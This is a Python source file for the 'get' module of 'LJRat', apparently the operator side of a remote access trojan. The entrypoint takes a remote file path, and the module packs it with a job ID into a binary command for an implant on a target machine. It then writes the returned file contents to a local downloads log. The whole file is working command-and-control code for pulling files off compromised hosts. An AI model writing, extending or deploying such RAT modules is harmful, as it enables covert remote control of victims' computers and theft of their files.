"""
Module that adds the get functionality to LJRat
"""

import struct
import message
import os
import log
from error import *
from helper import str_to_c_str, get_timestamp_str
from globals import ctx
from session import HEADER_LEN, INT_SIZE

MODULE_ID = 0x01
LOADED = True
DLL_NAME = None

def entrypoint(self, args):
    """ Get a file from target
    'get remote_file.exe'
    """

    args = validator(args)
    if not args:
        return None

    module_args = {"REMOTE_FILE": args, "JOB_ID": ctx.get_next_job()}
    msg = message.Message(_serialize(module_args))
    return msg

def validator(args):
    '''Function to validate arguments'''

    args = args.split()
    if len(args) < 1:
        print("Invalid command - Refer to help for valid syntax")
        return None
    
    return args

def _serialize(data):
    '''Function to take all the required arguments and pack a data structure with binary data'''
    serialized_data = bytearray()

    result_code = 0
    cmd_type = MODULE_ID
    job_id = data["JOB_ID"]
    remote_file = str_to_c_str(data["REMOTE_FILE"])
    remote_filename_len = len(remote_file)
    data_len = HEADER_LEN + INT_SIZE + remote_filename_len

    serialized_data.extend(struct.pack("I", data_len))
    serialized_data.extend(struct.pack("I", job_id))
    serialized_data.extend(struct.pack("I", cmd_type))
    serialized_data.extend(struct.pack("I", result_code))
    serialized_data.extend(struct.pack("I", remote_filename_len))
    serialized_data.extend(struct.pack(f"{remote_filename_len}s", remote_file))

    return serialized_data

def _deserialize(msg):
    '''Function that calls the formatter and outputs the data to a log'''
    log_dir = ctx.log_dir + os.sep + "downloads"

    if msg.result_code == E_SUCCESS:
        log.write_to_log(log_dir, ".download", msg.payload, "File successfully downloaded to: ")
    else:
        print(f"Error downloading file: {ERROR_TABLE[msg.result_code]}")

    return